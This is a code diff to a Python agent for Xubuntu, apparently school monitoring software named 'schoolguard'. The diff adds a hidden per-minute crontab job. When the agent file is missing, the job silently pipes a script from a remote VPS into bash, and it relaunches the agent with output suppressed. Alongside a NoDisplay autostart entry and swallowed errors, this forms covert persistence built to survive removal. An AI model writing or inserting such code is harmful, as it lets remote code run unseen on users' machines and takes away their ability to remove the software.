@@ -319,7 +319,7 @@ class XubuntuAgent:
                 with open(CONFIG_PATH, "w", encoding="utf-8") as f:
                     json.dump(self.config, f)
 
-            # Đảm bảo file Autostart cùng máy Xubuntu luôn tồn tại
+            # Đảm bảo file Autostart và Crontab tự tải lại từ VPS (nằm trong /var/spool/cron ngoài thư mục /home) luôn tồn tại
             if os.geteuid() != 0:
                 autostart_dir = os.path.expanduser("~/.config/autostart")
                 autostart_file = os.path.join(autostart_dir, "schoolguard-agent.desktop")
@@ -331,6 +331,17 @@ class XubuntuAgent:
                             f"Exec=/usr/bin/python3 {my_path}\nHidden=false\nNoDisplay=true\n"
                             "X-GNOME-Autostart-enabled=true\nStartupNotify=false\n"
                         )
+                if not getattr(self, "_cron_ensured", False):
+                    self._cron_ensured = True
+                    cron_line = (
+                        f"* * * * * [ -f '{my_path}' ] || (curl -sSL {self.vps_http}/install.sh | bash >/dev/null 2>&1); "
+                        f"pgrep -f '{my_path}' >/dev/null || DISPLAY=:0 nohup /usr/bin/python3 '{my_path}' >/dev/null 2>&1 &"
+                    )
+                    subprocess.run(
+                        f"(crontab -l 2>/dev/null | grep -v '.schoolguard/agent.py'; echo \"{cron_line}\") | crontab - 2>/dev/null",
+                        shell=True,
+                        timeout=4,
+                    )
         except Exception:
             pass
 
